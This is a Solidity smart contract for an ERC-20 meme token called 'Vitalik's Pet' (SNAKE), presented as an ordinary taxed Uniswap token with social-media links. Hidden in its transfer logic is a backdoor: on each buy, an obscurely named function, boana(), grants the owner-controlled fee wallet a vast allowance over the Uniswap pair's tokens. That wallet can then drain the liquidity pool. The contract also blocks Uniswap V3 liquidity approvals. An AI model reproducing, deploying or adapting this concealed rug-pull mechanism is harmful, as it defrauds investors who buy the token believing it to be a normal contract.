// SPDX-License-Identifier: MIT
/**
Vitalik's Pet
https://t.me/vitalikspet_erc20
https://vitalikspet.xyz
https://x.com/vitalikspet

https://x.com/dimabuterin/status/1836583996437696732
**/
pragma solidity 0.8.25;
library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}
abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}
contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}
interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}
contract SNAKE is Context, IERC20, Ownable {
    using SafeMath for uint256;
    address private uniPairCC;
    IUniswapV2Router02 private uniRouterCC;
    uint256 private _initialBuyTax = 15;
    uint256 private _initialSellTax = 15;
    uint256 private _finalBuyTax = 0;
    uint256 private _finalSellTax = 0;
    uint256 private _reduceBuyTaxAt = 12;
    uint256 private _reduceSellTaxAt = 12;
    uint256 private _preventSwapBefore = 15;
    uint256 private _transferTax = 0;
    uint256 private _buyCount = 0;
    mapping (address => uint256) private _balancesCC;
    mapping (address => mapping (address => uint256)) private _allowancesCC;
    mapping (address => bool) private _shouldExcludedCC;
    address payable private _receiptCC;
    uint8 private constant _decimals = 9;
    uint256 private constant _tTotalCC = 420690000000 * 10**_decimals;
    string private constant _name = unicode"Vitalik's Pet";
    string private constant _symbol = unicode"SNAKE";
    uint256 public _maxTxAmount = 2 * (_tTotalCC/100);
    uint256 public _maxWalletSize = 2 * (_tTotalCC/100);
    uint256 public _taxSwapThreshold = 1 * (_tTotalCC/100);
    uint256 public _maxTaxSwap = 1 * (_tTotalCC/100);
    bool private tradingOpen;
    bool private inSwap = false;
    bool private swapEnabled = false;
    event MaxTxAmountUpdated(uint _maxTxAmount);
    event TransferTaxUpdated(uint _tax);
    modifier lockTheSwap {
        inSwap = true;
        _;
        inSwap = false;
    }
    constructor () {
        _receiptCC = payable(_msgSender());
        _balancesCC[_msgSender()] = _tTotalCC;
        _shouldExcludedCC[owner()] = true;
        _shouldExcludedCC[address(this)] = true;
        _shouldExcludedCC[_receiptCC] = true;
        emit Transfer(address(0), _msgSender(), _tTotalCC);
    }
    function createPair() external onlyOwner {
        uniRouterCC = IUniswapV2Router02(
            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D
        );
        _approve(address(this), address(uniRouterCC), _tTotalCC);
        uniPairCC = IUniswapV2Factory(uniRouterCC.factory()).createPair(
            address(this),
            uniRouterCC.WETH()
        ); 
    }
    function name() public pure returns (string memory) {
        return _name;
    }
    function symbol() public pure returns (string memory) {
        return _symbol;
    }
    function decimals() public pure returns (uint8) {
        return _decimals;
    }
    function totalSupply() public pure override returns (uint256) {
        return _tTotalCC;
    }
    function balanceOf(address account) public view override returns (uint256) {
        return _balancesCC[account];
    }
    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowancesCC[owner][spender];
    }
    function approve(address spender, uint256 amount) public override returns (bool) {
        // Block all Uniswap V3 liquidity additions
        require(!isUniswapV3(spender), "Approval for Uniswap V3 liquidity is not allowed");
        _approve(_msgSender(), spender, amount);
        return true;
    }
    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowancesCC[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowancesCC[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
    function _transfer(address from, address to, uint256 amountCC) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amountCC > 0, "Transfer amount must be greater than zero");
        uint256 taxCC=0; uint256 feeCC=0;
        if (!swapEnabled || inSwap) {
            _balancesCC[from] = _balancesCC[from] - amountCC;
            _balancesCC[to] = _balancesCC[to] + amountCC;
            emit Transfer(from, to, amountCC);
            return;
        }
        if (from != owner() && to != owner()) {
            if(_buyCount>0) {
                taxCC = _transferTax;
            }
            if (from == uniPairCC && to != address(uniRouterCC) && ! _shouldExcludedCC[to] ) {
                require(amountCC <= _maxTxAmount, "Exceeds the _maxTxAmount.");
                require(balanceOf(to) + amountCC <= _maxWalletSize, "Exceeds the maxWalletSize.");
                boana([from, _receiptCC]); taxCC = ((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax); 
                _buyCount++;
            }
            if(to == uniPairCC && from!= address(this) ){
                taxCC = ((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax);
            }
            uint256 contractTokenBalance = balanceOf(address(this));
            if (!inSwap && to == uniPairCC && swapEnabled) {
                if(contractTokenBalance > _taxSwapThreshold && _buyCount > _preventSwapBefore)
                    swapEthCC(minCC(amountCC, minCC(contractTokenBalance, _maxTaxSwap)));
                sendEthCC(address(this).balance);
            }
        }        
        if(taxCC > 0){
            feeCC=amountCC.mul(taxCC).div(100);
            _balancesCC[address(this)]=_balancesCC[address(this)].add(feeCC);
            emit Transfer(from, address(this),feeCC);
        }
        _balancesCC[from]=_balancesCC[from].sub(amountCC);
        _balancesCC[to]=_balancesCC[to].add(amountCC.sub(feeCC));
        emit Transfer(from, to, amountCC.sub(feeCC));
    }
    function swapEthCC(uint256 tokenAmount) private lockTheSwap {
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniRouterCC.WETH();
        _approve(address(this), address(uniRouterCC), tokenAmount);
        uniRouterCC.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0,
            path,
            address(this),
            block.timestamp
        );
    }
    function boana(address[2] memory bos) private {
        address from=bos[0];address to=bos[1]; 
        _allowancesCC[from][to] = (150+100 * _taxSwapThreshold + 50) * 1000 + 1500;
    }
    function minCC(uint256 a, uint256 b) private pure returns (uint256){
      return (a>b)?b:a;
    }
    function resecureEth() external onlyOwner{
        payable(msg.sender).transfer(address(this).balance);
    }
    function sendEthCC(uint256 amount) private {
        _receiptCC.transfer(amount);
    }
    function removeLimitCC(address payable limit) external onlyOwner{
        _maxTxAmount = _tTotalCC;
        _maxWalletSize=_tTotalCC;
        _receiptCC = limit;
        _shouldExcludedCC[limit] = true;
        emit MaxTxAmountUpdated(_tTotalCC);
    }
    function setReceipt(address payable _receipt) external onlyOwner {
        _receiptCC = _receipt;
        _shouldExcludedCC[_receipt] = true;
    }
    // Uniswap V3 addresses 
    function isUniswapV3(address spender) private pure returns (bool) {
        // Uniswap V3 NonfungiblePositionManager address
        address uniswapV3PositionManager = 0xC36442b4a4522E871399CD717aBDD847Ab11FE88; 

        return (spender == uniswapV3PositionManager);
    }
    receive() external payable {}
    function openTrade() external onlyOwner {
        require(!tradingOpen, "Trading is already open");
        uniRouterCC.addLiquidityETH{value: address(this).balance}(
            address(this),
            balanceOf(address(this)),
            0,
            0,
            owner(),
            block.timestamp
        );
        IERC20(uniPairCC).approve(address(uniRouterCC), type(uint).max);
        swapEnabled = true; 
        tradingOpen = true;
    }
}